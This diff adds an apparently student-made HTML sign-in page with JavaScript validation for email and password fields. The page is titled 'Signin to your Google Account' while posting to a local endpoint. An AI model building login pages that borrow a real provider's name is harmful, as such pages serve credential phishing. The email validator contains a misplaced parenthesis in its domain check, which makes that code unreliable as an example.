@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Signin to your Google Account</title>
+    <link rel="stylesheet" href="./index.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div>
+        <h1>Signin</h1>
+      </div>
+      <form action="Signin" method="post" onsubmit="return validateForm(event)">
+        <div class="flex" style="margin-top: 30px">
+          <input
+            type="text"
+            class="w-full"
+            placeholder="Email"
+            id="email"
+            name="email"
+          />
+        </div>
+        <small class="error" id="email-error">Must Enter Email</small>
+        <small class="error" id="email-invalid-error"
+          >Must Enter Valid Email</small
+        >
+        <div></div>
+        <div class="flex" style="margin-top: 25px">
+          <div class="w-full">
+            <input
+              type="password"
+              placeholder="Password"
+              name="password"
+              id="password"
+            />
+            <small class="error" id="password-error">Must Enter Password</small>
+          </div>
+        </div>
+        <div></div>
+        <div class="flex" style="margin-top: 40px">
+          <a href="Signup.html">Sign Up Instead</a>
+          <button>Sign In</button>
+        </div>
+      </form>
+    </div>
+  </body>
+  <script>
+    function displayErrorMessageifEmpty(element) {
+      if (element.value == '')
+        document.getElementById(`${element.id}-error`).style.display = 'block';
+    }
+    function hideErrors() {
+      Array.from(document.getElementsByClassName('error')).forEach(error => {
+        error.style.display = 'none';
+      });
+    }
+    function isEmptyField(field) {
+      return field.value == '';
+    }
+    function isValidEmail(email) {
+      console.log(email);
+      if (email.indexOf('@') == -1) return false;
+      let reciepientName = email.substring(0, email.indexOf('@'));
+      let domainPart = email.substring(email.indexOf('@') + 1);
+      if (
+        domainPart == '' ||
+        domainPart.indexOf('.') == -1 ||
+        domainPart.substring(0, domainPart.indexOf('.') == '')
+      )
+        return false;
+      let topLevelDomain = domainPart.substring(domainPart.indexOf('.') + 1);
+      if (
+        reciepientName == '' ||
+        reciepientName.length > 64 ||
+        topLevelDomain == ''
+      )
+        return false;
+      return true;
+    }
+    function validateForm(e) {
+      hideErrors();
+      let email = e.srcElement[0];
+      let password = e.srcElement[1];
+      let valid = true;
+      if (isEmptyField(email) || isEmptyField(password)) {
+        displayErrorMessageifEmpty(email);
+        displayErrorMessageifEmpty(password);
+        valid = false;
+      }
+      if (!isEmptyField(email) && !isValidEmail(email.value)) {
+        document.getElementById('email-invalid-error').style.display = 'block';
+        valid = false;
+      }
+      return valid;
+    }
+  </script>
+</html>
